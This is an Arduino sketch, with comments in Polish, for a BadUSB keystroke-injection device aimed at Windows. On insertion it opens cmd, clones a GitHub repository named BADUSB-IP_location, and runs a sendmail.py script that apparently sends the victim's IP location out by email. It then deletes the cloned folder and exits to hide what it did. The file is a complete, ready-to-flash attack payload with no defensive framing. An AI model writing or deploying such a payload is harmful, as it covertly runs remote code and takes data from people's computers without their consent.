#include <Keyboard.h>

void setup() {
  // put your setup code here, to run once:
Keyboard.begin();
delay(4000);

// otwarcie okna
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
Keyboard.releaseAll();
delay(150);
// otwarcie cmd 
Keyboard.print("cmd.exe");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);
// ustawienie sciezki
Keyboard.print("cd ..");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);
// wejscie
Keyboard.print("cd Public");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);
// klonowanie repo
Keyboard.print("git clone https://github.com/PSZMAJ/BADUSB-IP_location.git ");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(6500);
// otwarcie folderu skryptu
Keyboard.print("cd BADUSB-IP_location ");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(700);
// uruchomienie skryptu
Keyboard.print("python sendmail.py ");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(7900);
// powrot i kasowanie folderu
Keyboard.print("cd ..");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(100);
Keyboard.print("rmdir BADUSB-IP_location /s");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(100);
Keyboard.print("y");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(100);
Keyboard.print("exit");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(100);
}
void loop() 
{
  // put your main code here, to run repeatedly:

}
